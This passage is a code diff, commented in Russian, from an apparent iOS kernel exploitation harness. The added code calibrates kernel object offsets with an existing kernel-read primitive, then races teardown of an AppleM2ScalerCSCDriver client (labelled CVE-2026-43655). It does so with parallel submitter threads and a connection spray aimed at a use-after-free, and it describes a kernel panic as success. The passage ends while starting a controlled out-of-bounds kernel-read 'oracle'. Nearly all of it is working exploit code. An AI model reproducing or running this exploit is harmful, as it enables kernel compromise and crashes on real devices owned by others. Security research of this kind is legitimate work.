+//       ВРЕМЯ close victim'а (оригинал ждал следующего цикла от SpringBoard) —
+//       гонка идёт прямо по teardown, а не post-factum.
+// ДЕСТРУКТИВНО: успех = паника ядра. Каждая строка fsync'ится в
+// Documents/kexproof-m2teardown.txt + kexproof-live.log (переживают ребут).
+
+// Live-запись M2T-стадий: паника не сотрёт готовое (паттерн kpGartLive).
+static BOOL gM2TLive = NO;
+static void kpM2TLive(NSString *line)
+{
+    if (!gM2TLive) return;
+    // os_log → device syslog по USB в реальном времени — паника ничего не забирает.
+    os_log_error(OS_LOG_DEFAULT, "[M2T] %{public}s", [line UTF8String]);
+    extern void KPLogDirect(const char *);
+    KPLogDirect([line UTF8String]); // зеркало в kexproof-live.log (переживает ребут)
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2teardown.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+    if (!h) { [d writeToFile:p atomically:NO]; return; }
+    [h seekToEndOfFile];
+    [h writeData:d];
+    [h synchronizeFile];   // fsync КАЖДОЙ строки — паника не сожрёт page cache
+    [h closeFile];
+}
+
+static void kpM2TNote(NSMutableString *r, NSString *line)
+{
+    kpNote(r, line);   // в отчёт + общий live-лог
+    kpM2TLive(line);   // + fsync-файл этого эксперимента
+}
+
+// kernel VA userClient'а коннекшена через наш ipc table (цепочка как в
+// m2ScalerUafReport: proc → proc_ro → task → itk_space → is_table (SMR)).
+static uint64_t kpM2TClientVA(NSMutableString *r, uint64_t isTable, io_connect_t conn, NSString *tag)
+{
+    if (!isTable || conn == IO_OBJECT_NULL) return 0;
+    uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (conn >> 8);
+    uint64_t oRaw = 0, kRaw = 0;
+    if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "m2t ie_object", r)) return 0;
+    uint64_t pVA = kp_untag_ptr(oRaw);
+    if (!kpLooksLikeKernelPointer(pVA)) return 0;
+    if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "m2t ip_kobject", r)) return 0;
+    uint64_t cVA = kp_untag_ptr(kRaw);
+    if (!kpLooksLikeKernelPointer(cVA)) {
+        kpM2TNote(r, [NSString stringWithFormat:@"    %@: kobj не kernel VA (%#llx)", tag, (unsigned long long)kRaw]);
+        return 0;
+    }
+    return cVA;
+}
+
+// Дамп ненулевых qword'ов объекта с diff против предыдущего снапшота (prev
+// обновляется на месте; *CHANGED* маркирует изменившиеся поля). Так оффсеты
+// 18.6 узнаются эмпирически, а не гаданием по 26.4.
+static void kpM2TDumpDiff(NSMutableString *r, uint64_t va, uint32_t size, NSString *tag, uint8_t *prev)
+{
+    uint8_t cur[0x400];
+    if (size > sizeof(cur)) size = sizeof(cur);
+    if (!kpLooksLikeKernelPointer(va)) {
+        kpM2TNote(r, [NSString stringWithFormat:@"    %@: %#llx не kernel VA — пропуск", tag, (unsigned long long)va]);
+        return;
+    }
+    memset(cur, 0, sizeof(cur));
+    if (!kpRead(va, cur, size, "m2t obj dump", r)) return;
+    kpM2TNote(r, [NSString stringWithFormat:@"    %@ @ %#llx (%#x байт):", tag, (unsigned long long)va, size]);
+    int shown = 0;
+    for (uint32_t o = 0; o + 8 <= size && shown < 96; o += 8) {
+        uint64_t q = 0, p = 0;
+        memcpy(&q, cur + o, 8);
+        memcpy(&p, prev + o, 8);
+        memcpy(prev + o, &q, 8);
+        if (!q && q == p) continue;   // ноль и не менялся — шум
+        kpM2TNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx%@", o, (unsigned long long)q,
+                      (q != p) ? @"  *CHANGED*" : @""]);
+        shown++;
+    }
+}
+
+// Итерация 2 (по железу 1.9.94): тихий снапшот объекта для diff'ов без шума.
+static BOOL kpM2TSnap(uint64_t va, uint8_t *dst, uint32_t size, NSMutableString *r)
+{
+    memset(dst, 0, size);
+    return kpLooksLikeKernelPointer(va) && kpRead(va, dst, size, "m2t snap", r);
+}
+
+// Печатает только изменившиеся qword'ы (→ значения), обновляет prev на месте.
+static int kpM2TDiffQuiet(NSMutableString *r, uint64_t va, uint32_t size, uint8_t *prev, NSString *tag)
+{
+    uint8_t cur[0x400];
+    if (size > sizeof(cur)) size = sizeof(cur);
+    if (!kpLooksLikeKernelPointer(va)) return 0;
+    memset(cur, 0, sizeof(cur));
+    if (!kpRead(va, cur, size, "m2t qdiff", r)) return -1;
+    int changed = 0;
+    for (uint32_t o = 0; o + 8 <= size; o += 8) {
+        uint64_t q = 0, p = 0;
+        memcpy(&q, cur + o, 8);
+        memcpy(&p, prev + o, 8);
+        if (q == p) continue;
+        if (!changed) kpM2TNote(r, tag);
+        kpM2TNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx → %#018llx",
+                      o, (unsigned long long)p, (unsigned long long)q]);
+        memcpy(prev + o, &q, 8);
+        changed++;
+    }
+    return changed;
+}
+
+// Считает вхождения u32-маркера в объекте (калибровка credit / stale entries).
+static uint32_t kpM2TCountMarker(uint64_t va, uint32_t size, uint32_t marker, NSMutableString *r)
+{
+    uint8_t buf[0x800];
+    if (size > sizeof(buf)) size = sizeof(buf);
+    memset(buf, 0, sizeof(buf));
+    if (!kpLooksLikeKernelPointer(va) || !kpRead(va, buf, size, "m2t marker scan", r)) return 0;
+    uint32_t n = 0;
+    for (uint32_t o = 0; o + 4 <= size; o += 4) {
+        uint32_t v = 0;
+        memcpy(&v, buf + o, 4);
+        if (v == marker) n++;
+    }
+    return n;
+}
+
+// Параллельный submitter: гонит async-опы (sel 1, TSD+0x008=1) на своём
+// коннекшене, пока main-тред делает close/spray — scheduler крутится во время
+// teardown'а victim'а, а не после него.
+static _Atomic bool gM2TStop = false;
+static _Atomic uint64_t gM2TSubmits = 0;
+typedef struct { io_connect_t conn; uint32_t srcID; uint32_t dstID; } KPM2TDriverArgs;
+static void *kpM2TDriverMain(void *arg)
+{
+    KPM2TDriverArgs *a = (KPM2TDriverArgs *)arg;
+    uint8_t tsd[KP_M2_TSD_SIZE];
+    memset(tsd, 0, sizeof(tsd));
+    *(uint32_t *)(tsd + 0x000) = a->srcID;   // +0x000 srcID u32
+    *(uint32_t *)(tsd + 0x004) = a->dstID;   // +0x004 dstID u32
+    *(uint64_t *)(tsd + 0x008) = 1;          // +0x008 async u64
+    while (!atomic_load(&gM2TStop)) {
+        IOConnectCallMethod(a->conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
+        atomic_fetch_add(&gM2TSubmits, 1);
+    }
+    return NULL;
+}
+
++ (NSString *)m2TeardownUafReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2teardown.txt"] error:nil];
+    gM2TLive = YES;
+    kpM2TNote(r, @"=== M2Scaler teardown UAF, calibration-first (CVE-2026-43655) ===");
+    kpM2TNote(r, @"!!! ДЕСТРУКТИВНО: успех = паника ядра. Каждая строка fsync'нута в Documents/kexproof-m2teardown.txt !!!");
+    kpM2TNote(r, @"Фаза A: калибровка 18.6-оффсетов на живом клиенте (kread-only, безопасно).");
+    kpM2TNote(r, @"Фаза B: victim credit=0xDEAD0001 + 50 async → close ПОД параллельным submitter'ом → спрей 0xBEEF0002.");
+
+    if (!gPrimitives.kreadbuf) {
+        kpM2TNote(r, @"KRW не жив — сначала эксплойт. SKIP (гонка без калибровки = слепая).");
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ---------------- сервис + victim ----------------
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpM2TNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: пусто (errno=%d %s) — драйвер не виден из sandbox",
+                      errno, errno ? strerror(errno) : "-"]);
+        kpM2TNote(r, @"=== M2T SKIP: сервис не найден ===");
+        gM2TLive = NO;
+        return r;
+    }
+    io_connect_t victim = IO_OBJECT_NULL;
+    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    kpM2TNote(r, [NSString stringWithFormat:@"  IOServiceOpen(victim, type 0): conn=0x%x kr=0x%x (%s)",
+                  victim, kr, mach_error_string(kr)]);
+    if (kr != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
+        kpM2TNote(r, @"  open отклонён sandbox'ом — SKIP");
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ---------------- is_table цепочка (как в m2ScalerUafReport) ----------------
+    uint64_t isTable = 0;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProofV2" log:r];
+    uint64_t pr = 0, tk = 0, spc = 0, tb = 0;
+    if (selfProc &&
+        kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "m2t proc_ro", r) &&
+        kpRead(kp_untag_ptr(pr) + off_proc_ro_pr_task, &tk, 8, "m2t task", r) &&
+        kpRead(kp_untag_ptr(tk) + off_task_itk_space, &spc, 8, "m2t itk_space", r) &&
+        kpRead(kp_untag_ptr(spc) + off_ipc_space_is_table, &tb, 8, "m2t is_table", r)) {
+        isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  is_table=%#llx %@", (unsigned long long)isTable,
+                  isTable ? @"" : @"— не разрешена, калибровка невозможна, SKIP"]);
+    if (!isTable) {
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    uint64_t victimVA = kpM2TClientVA(r, isTable, victim, @"victim");
+    kpM2TNote(r, [NSString stringWithFormat:@"  victim IOSurfaceAcceleratorClient @ %#llx (18.6: размер класса 0x168)",
+                  (unsigned long long)victimVA]);
+    if (!victimVA) {
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ================= ФАЗА A: калибровка оффсетов 18.6 =================
+    kpM2TNote(r, @"--- ФАЗА A: калибровка (всё kread-only, драйвер почти не тронут) ---");
+    uint8_t clientSnap[0x400];
+    memset(clientSnap, 0, sizeof(clientSnap));
+    kpM2TDumpDiff(r, victimVA, 0x168, @"A1 client baseline (сразу после open)", clientSnap);
+
+    // Цепочка scheduler (статика 18.6 из bug-hunt раунда 2: submit sel 1 читает
+    // [UC+0xe8] → объект → [тот+0xb8] = scheduler (IOAsynchronousScheduler, 0x2c50)).
+    uint64_t provRaw = 0, schedRaw = 0;
+    uint64_t provVA = 0, schedVA = 0;
+    if (kpRead(victimVA + 0xe8, &provRaw, 8, "m2t client+0xe8", r)) {
+        provVA = kp_untag_ptr(provRaw);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A2 [client+0xe8] = %#llx %@", (unsigned long long)provRaw,
+                      kpLooksLikeKernelPointer(provVA) ? @"— kernel ptr, дамплю:" : @"— не kernel ptr, цепочка scheduler тут не лежит"]);
+        if (kpLooksLikeKernelPointer(provVA)) {
+            uint8_t provSnap[0x400];
+            memset(provSnap, 0, sizeof(provSnap));
+            kpM2TDumpDiff(r, provVA, 0x100, @"A2 [client+0xe8] объект", provSnap);
+            if (kpRead(provVA + 0xb8, &schedRaw, 8, "m2t prov+0xb8", r)) {
+                schedVA = kp_untag_ptr(schedRaw);
+                kpM2TNote(r, [NSString stringWithFormat:@"  A3 [prov+0xb8] = %#llx %@", (unsigned long long)schedRaw,
+                              kpLooksLikeKernelPointer(schedVA) ? @"— kernel ptr (scheduler-кандидат):" : @"— не kernel ptr"]);
+            }
+        }
+    }
+    uint8_t schedSnap[0x400];
+    memset(schedSnap, 0, sizeof(schedSnap));
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A3 scheduler baseline", schedSnap);
+
+    // A4: оффсет credit — маркер 0xCAFEBABE через sel 10, diff клиента покажет,
+    // куда он лёг. Статика 18.6 предсказывает [client+0x148]; PoC 26.4 имел +0x158.
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xCAFEBABE;
+        uint64_t sc[3] = {0, 0, 0};
+        kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A4 sel 10 credit=0xCAFEBABE: kr=0x%x — ищу маркер в клиенте:", ckr]);
+    }
+    uint32_t creditOff = 0;
+    {
+        uint8_t buf[0x200];
+        memset(buf, 0, sizeof(buf));
+        if (kpRead(victimVA, buf, sizeof(buf), "m2t client after credit", r)) {
+            for (uint32_t o = 0; o + 4 <= sizeof(buf); o += 4) {
+                uint32_t v = 0;
+                memcpy(&v, buf + o, 4);
+                if (v == 0xCAFEBABE) {
+                    creditOff = o;
+                    kpM2TNote(r, [NSString stringWithFormat:@"    credit-маркер 0xCAFEBABE найден @ client+0x%03x", o]);
+                }
+            }
+            if (!creditOff)
+                kpM2TNote(r, @"    маркер НЕ найден в первых 0x200 — sel 10 пишет не в клиента (или kr!=0 выше)");
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  A4 вердикт: credit offset на этом железе = %#x (racesan предсказывал 0x148, PoC(26.4) 0x158)",
+                  creditOff]);
+
+    // Итерация 2 (железо 1.9.94: маркер в клиенте НЕ нашёлся, async клиента не
+    // трогает): собираем все kernel-указатели из клиента — credit и op-записи
+    // живут в одном из pointee-объектов (per-pipeline контексты страйдом 0x38).
+    uint64_t clientPtrs[32];
+    uint32_t clientPtrCnt = 0;
+    {
+        uint8_t buf[0x200];
+        memset(buf, 0, sizeof(buf));
+        if (kpRead(victimVA, buf, sizeof(buf), "m2t client ptr walk", r)) {
+            for (uint32_t o = 0; o + 8 <= 0x168 && clientPtrCnt < 32; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (uint32_t k = 0; k < clientPtrCnt; k++) if (clientPtrs[k] == p) { dup = YES; break; }
+                if (!dup) clientPtrs[clientPtrCnt++] = p;
+            }
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  A4b: в клиенте %u уникальных kernel-указателей — credit/очередь ищем там", clientPtrCnt]);
+
+    // A4b: матрица кодировок sel 10 — 4 пробы с различимыми маркерами; ищем
+    // каждый сразу после своего вызова в клиенте И во всех pointee-объектах.
+    {
+        struct { uint32_t marker; const char *how; } probes[4] = {
+            { 0xCAFE0001, "struct+0" }, { 0xCAFE0002, "struct+8" },
+            { 0xCAFE0003, "scalar[0]" }, { 0xCAFE0004, "scalar[1]" },
+        };
+        for (int i = 0; i < 4; i++) {
+            uint8_t s10[0x18];
+            memset(s10, 0, sizeof(s10));
+            uint64_t sc[3] = {0, 0, 0};
+            if (i == 0) *(uint32_t *)(s10 + 0) = probes[i].marker;
+            if (i == 1) *(uint32_t *)(s10 + 8) = probes[i].marker;
+            if (i == 2) sc[0] = probes[i].marker;
+            if (i == 3) sc[1] = probes[i].marker;
+            kern_return_t pkr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            uint32_t where = 0;
+            uint64_t hitVA = 0;
+            if (kpM2TCountMarker(victimVA, 0x168, probes[i].marker, r)) { where = 1; hitVA = victimVA; }
+            for (uint32_t k = 0; k < clientPtrCnt && !where; k++) {
+                if (kpM2TCountMarker(clientPtrs[k], 0x400, probes[i].marker, r)) { where = 2; hitVA = clientPtrs[k]; }
+            }
+            kpM2TNote(r, [NSString stringWithFormat:@"    A4b %s маркер %#x: kr=0x%x → %@", probes[i].how, probes[i].marker, pkr,
+                          where == 1 ? @"В КЛИЕНТЕ" :
+                          where == 2 ? [NSString stringWithFormat:@"в pointee @ %#llx", (unsigned long long)hitVA] : @"нигде не найден"]);
+        }
+    }
+
+    // A5: один async-оп на victim'е → diff scheduler'а: видно, куда ложатся
+    // записи (count/list head/tail). Так узнаём op-entry linkage оффсеты.
+    NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
+                          (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    if (!srcS || !dstS) {
+        kpM2TNote(r, @"  IOSurfaceCreate NULL — SKIP (драйвер не тронут)");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+    // По PoC поверхности не освобождаются до конца прогона (async-опы по ID).
+    kpM2TNote(r, [NSString stringWithFormat:@"  IOSurface 32x32 BGRA: srcID=%u dstID=%u", srcID, dstID]);
+
+    uint8_t tsdBase[KP_M2_TSD_SIZE];
+    memset(tsdBase, 0, sizeof(tsdBase));
+    *(uint32_t *)(tsdBase + 0x000) = srcID;
+    *(uint32_t *)(tsdBase + 0x004) = dstID;
+
+    kern_return_t bkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdBase, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpM2TNote(r, [NSString stringWithFormat:@"  A5 sync baseline (sel 1): kr=0x%x (%s)", bkr, mach_error_string(bkr)]);
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A5 scheduler после sync baseline", schedSnap);
+    {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        kern_return_t akr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A5 один async-оп (sel 1, TSD+8=1): kr=0x%x", akr]);
+    }
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A5 scheduler после 1 async (смотри *CHANGED* — там живут записи)", schedSnap);
+    kpM2TDumpDiff(r, victimVA, 0x168, @"A5 client после 1 async", clientSnap);
+
+    // A6 (итерация 2): тихие снапшоты ВСЕХ pointee-объектов → один async →
+    // печатаем только изменившиеся. Async клиента не трогает (прогон 1.9.94),
+    // значит op-записи/очередь живут в одном из pointee. Изменившийся объект =
+    // queue-кандидат, его VA уходит в фазу B для детекции stale-маркеров.
+    uint64_t queueVA = 0;
+    static uint8_t ptSnap[32 * 0x100];
+    memset(ptSnap, 0, sizeof(ptSnap));
+    for (uint32_t i = 0; i < clientPtrCnt; i++)
+        kpM2TSnap(clientPtrs[i], &ptSnap[i * 0x100], 0x100, r);
+    {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        kern_return_t a6kr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A6 async для pointee-diff: kr=0x%x", a6kr]);
+    }
+    usleep(3000);   // scheduler ставит/снимает запись
+    {
+        int hits = 0;
+        for (uint32_t i = 0; i < clientPtrCnt; i++) {
+            NSString *tag = [NSString stringWithFormat:@"    A6 pointee[%u] @ %#llx ИЗМЕНИЛСЯ после async:", i,
+                             (unsigned long long)clientPtrs[i]];
+            int c = kpM2TDiffQuiet(r, clientPtrs[i], 0x100, &ptSnap[i * 0x100], tag);
+            if (c > 0) {
+                hits++;
+                if (!queueVA) queueVA = clientPtrs[i];
+            }
+        }
+        kpM2TNote(r, [NSString stringWithFormat:@"  A6 вердикт: изменилось pointee-объектов: %d → queue-кандидат %#llx %@",
+                      hits, (unsigned long long)queueVA,
+                      queueVA ? @"(в фазе B считаю маркеры в нём)" : @"— записи вне pointees клиента (driver-global?)"]);
+    }
+
+    // ================= ФАЗА B: гонка =================
+    kpM2TNote(r, @"--- ФАЗА B: teardown race (паника возможна в любой момент) ---");
+
+    // Параллельные submitter'ы на ДВУХ других коннекшенах (итерация 2: один
+    // тред успевал только ~5 опов за close — давление на окно удваиваем).
+    io_connect_t driver = IO_OBJECT_NULL, driver2 = IO_OBJECT_NULL;
+    kern_return_t dkr = IOServiceOpen(svc, mach_task_self(), 0, &driver);
+    kern_return_t dk2 = IOServiceOpen(svc, mach_task_self(), 0, &driver2);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B0 driver-коннекшены: #1 conn=0x%x kr=0x%x, #2 conn=0x%x kr=0x%x", driver, dkr, driver2, dk2]);
+    if (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL) {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xBEEF0002;
+        uint64_t sc[3] = {0, 0, 0};
+        IOConnectCallMethod(driver, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+    }
+    if (dk2 == KERN_SUCCESS && driver2 != IO_OBJECT_NULL) {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xBEEF0003;
+        uint64_t sc[3] = {0, 0, 0};
+        IOConnectCallMethod(driver2, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+    }
+
+    // B1: victim credit + 50 async-опов
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xDEAD0001;
+        uint64_t sc[3] = {0, 0, 0};
+        kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  B1 victim credit=0xDEAD0001: kr=0x%x", ckr]);
+    }
+    if (creditOff) {
+        uint32_t chk = 0;
+        if (kpRead(victimVA + creditOff, &chk, 4, "m2t credit verify", r))
+            kpM2TNote(r, [NSString stringWithFormat:@"    kread client+%#x = %#x %@", creditOff, chk,
+                          chk == 0xDEAD0001 ? @"— маркер на месте (калибровка верна)" : @"— НЕ совпал, калибровка мимо"]);
+    }
+    // B1: victim credit + 150 async-опов (итерация 2: больше pending-записей =
+    // длиннее purge при teardown = шире окно гонки; в 1.9.94 submitter успевал
+    // только 5 опов за close — окно надо растягивать).
+    int asyncOK = 0;
+    for (int i = 0; i < 150; i++) {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        if (IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL) == KERN_SUCCESS) asyncOK++;
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  B1 async-опы victim: %d/150 OK — записи с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B1 queue-кандидат @ %#llx: маркеров 0xDEAD0001 = %u (столько записей victim'а видно)",
+                      (unsigned long long)queueVA, kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r)]);
+
+    // B2: submitter'ы стартуют ДО close — гонка идёт по живому teardown'у.
+    gM2TSubmits = 0;
+    atomic_store(&gM2TStop, false);
+    KPM2TDriverArgs dargs = { driver, srcID, dstID };
+    KPM2TDriverArgs dargs2 = { driver2, srcID, dstID };
+    pthread_t dth, dth2;
+    BOOL driverRuns = (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL && pthread_create(&dth, NULL, kpM2TDriverMain, &dargs) == 0);
+    BOOL driver2Runs = (dk2 == KERN_SUCCESS && driver2 != IO_OBJECT_NULL && pthread_create(&dth2, NULL, kpM2TDriverMain, &dargs2) == 0);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B2 submitter-треды: #1 %@, #2 %@ (гонят async во время close)",
+                  driverRuns ? @"запущен" : @"НЕ запущен",
+                  driver2Runs ? @"запущен" : @"НЕ запущен"]);
+
+    // B3: teardown victim'а под гонящим scheduler'ом
+    kpM2TNote(r, @"  B3 IOServiceClose(victim) — точка невозврата (per_client 0x168 (18.6; 0x170 в PoC 26.4) + ops освобождаются, записи scheduler'а висят)");
+    kern_return_t ckr = IOServiceClose(victim);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B3 IOServiceClose: kr=0x%x — victim освобождён; submitter уже сделал %llu опов",
+                  ckr, (unsigned long long)atomic_load(&gM2TSubmits)]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B3 queue ПОСЛЕ close: маркеров 0xDEAD0001 = %u %@", 
+                      kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r),
+                      @"(>0 = teardown НЕ чистит записи — CVE-2026-43655 stale confirmed)"]);
+
+    // B4: спрей 50 коннекшенов (credit=0xBEEF0002), НЕ закрываем — держим слот занятым.
+    io_connect_t spray[50];
+    int sprayOK = 0;
+    for (int i = 0; i < 50; i++) {
+        spray[i] = IO_OBJECT_NULL;
+        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+        if (skr == KERN_SUCCESS && spray[i] != IO_OBJECT_NULL) {
+            sprayOK++;
+            uint8_t s10[0x18];
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = 0xBEEF0002;
+            uint64_t sc[3] = {0, 0, 0};
+            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  B4 спрей: %d/50 открыто, credit=0xBEEF0002 у каждого", sprayOK]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B4 queue ПОСЛЕ спрея: 0xDEAD0001 = %u, 0xBEEF0002 = %u (соседство маркеров = stale entry и spray-entry в одной очереди)",
+                      kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r),
+                      kpM2TCountMarker(queueVA, 0x400, 0xBEEF0002, r)]);
+
+    // B5: слот victim'а после спрея — кто-то занял? (kread по старому VA:
+    // freed/reused память; чтение freed zone-объекта безопасно — он в зоне)
+    kpM2TDumpDiff(r, victimVA, 0x168, @"B5 слот victim после спрея (переиспользован?)", clientSnap);
+    if (creditOff) {
+        uint32_t chk = 0;
+        if (kpRead(victimVA + creditOff, &chk, 4, "m2t slot credit", r))
+            kpM2TNote(r, [NSString stringWithFormat:@"    slot victim: credit-поле = %#x (%@)", chk,
+                          chk == 0xDEAD0001 ? @"стоит victim-маркер — слот не переиспользован" :
+                          chk == 0xBEEF0002 ? @"стоит spray-маркер — UAF-слот занят спреем!" : @"перезаписан чем-то иным"]);
+    }
+
+    // B6: гоним scheduler: 60 раундов × спрей + submitter всё это время крутится.
+    kpM2TNote(r, @"  B6 60 раундов × 50 async-опов на спрее + submitter крутится (паника возможна в любой момент)");
+    for (int round = 0; round < 60; round++) {
+        for (int i = 0; i < sprayOK && i < 50; i++) {
+            if (spray[i] != IO_OBJECT_NULL) {
+                uint8_t tsd[KP_M2_TSD_SIZE];
+                memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+                *(uint64_t *)(tsd + 0x008) = 1;
+                IOConnectCallMethod(spray[i], 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            }
+        }
+        if (round % 10 == 0)
+            kpM2TNote(r, [NSString stringWithFormat:@"  раунд %d/60 — живы (submitter: %llu опов)", round,
+                          (unsigned long long)atomic_load(&gM2TSubmits)]);
+        usleep(100000);
+    }
+
+    atomic_store(&gM2TStop, true);
+    if (driverRuns) pthread_join(dth, NULL);
+    if (driver2Runs) pthread_join(dth2, NULL);
+    kpM2TNote(r, [NSString stringWithFormat:@"  submitter остановлен (%llu опов всего)", (unsigned long long)atomic_load(&gM2TSubmits)]);
+
+    kpM2TNote(r, @"--- 60 раундов завершены, паники не было — баг не сработал в этом прогоне, повторить ---");
+    kpM2TNote(r, @"Паника ПОСЛЕ возврата отчёта тоже считается: весь ход в kexproof-m2teardown.txt на диске. Чтение паник-лога: x9=0xBEEF0002 → UAF CONFIRMED; x9=0xDEAD0001 → stale entry victim'а.");
+    IOObjectRelease(svc);
+    gM2TLive = NO;
+    return r;
+}
+
+#pragma mark - M2Scaler oracle (CVE-2026-43655 controlled OOB-read)
+
+// Итерация 3. Из подтверждённой паники 045942 (символизация, раунд 11):
+// credit-resolution pass scheduler'а делает ldrb w10, [sched+0x118 + credit],
+// где credit = поле +0xc3c op-записи — ПОЛНОСТЬЮ наш (sel 10, кодировка
+// struct+0 доказана A4b на железе 1.9.96). Дальше pass делает
+// RMW [entry+0xbc4] += прочитанный_байт и условный [entry+0x1f74] |= 0x100.
+// Значит: credit = смещение → байт из [sched+0x118+смещение] аккумулируется
+// в НАШЕЙ же op-записи → читаем её kread'ом = относительный OOB-read
+// (+0..+4GB от scheduler'а), второй leak-канал, независимый от ClearSword.
+// Метод: discovery (driver → scheduler → entry array → entry VA по уникальному
+// srcID; credit при discovery = 0x10 — маркер в credit = бомба, паника 0639)
+// → oracle-свип смещений с валидацией против прямого kread.
+
+static BOOL gM2OLive = NO;
+static void kpM2OLive(NSString *line)
+{
